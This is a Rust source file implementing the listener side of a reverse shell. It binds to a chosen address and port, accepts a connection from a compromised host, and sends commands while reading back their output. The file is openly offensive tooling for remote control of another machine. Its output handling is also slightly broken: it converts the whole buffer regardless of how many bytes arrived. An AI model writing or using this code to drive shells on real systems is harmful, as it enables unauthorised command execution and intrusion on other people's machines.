use std::{
    net,
    thread,
    time
};
use std::error::Error;
use std::io::{Read, Write};

pub struct ReverseShell {
    socket: net::TcpStream,
    pub remote_endpoint: net::SocketAddr,
    buffer: [u8; 2048]
}

impl ReverseShell {

    pub fn new(lhost: net::IpAddr, lport: u16) -> Result<Self, Box<dyn Error>> {
        let listener = net::TcpListener::bind((lhost, lport))?;
        let (socket, remote_endpoint) = listener.accept()?;
        let mut shell = ReverseShell { socket, remote_endpoint, buffer: [0u8; 2048] };
        shell.read_output()?; // Go ahead and read the shell banner
        Ok(shell)
    }

    pub fn exec(&mut self, cmd: &str) -> Result<String, Box<dyn Error>> {
        self.write_command(cmd)?;
        thread::sleep(time::Duration::from_secs(1));
        let output = self.read_output()?;
        Ok(output)
    }

    fn write_command(&mut self, cmd: &str) -> Result<(), Box<dyn Error>> {
        self.socket.write(cmd.as_bytes())?;
        self.socket.write(b"\n")?;
        self.socket.flush()?;
        Ok(())
    }

    fn read_output(&mut self) -> Result<String, Box<dyn Error>> {
        self.socket.read(&mut self.buffer)?; 
        let output = String::from_utf8(self.buffer.to_vec())?;
        Ok(output)
    }
}   
